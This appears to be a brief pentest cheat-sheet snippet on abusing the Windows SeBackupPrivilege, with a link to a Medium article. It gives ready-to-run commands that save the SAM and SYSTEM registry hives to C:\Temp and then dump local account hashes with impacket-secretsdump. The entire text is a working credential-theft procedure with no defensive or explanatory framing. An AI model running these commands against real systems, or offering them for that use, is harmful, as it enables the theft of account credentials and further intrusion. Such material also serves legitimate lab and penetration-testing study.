
- [Make copy](https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960) of the SAM and SYSTEM files

```
cd c:\
mkdir Temp
reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system
```

-Dump the secrets with impacket: 

```
impacket-secretsdump -system SYSTEM -sam SAM local
```

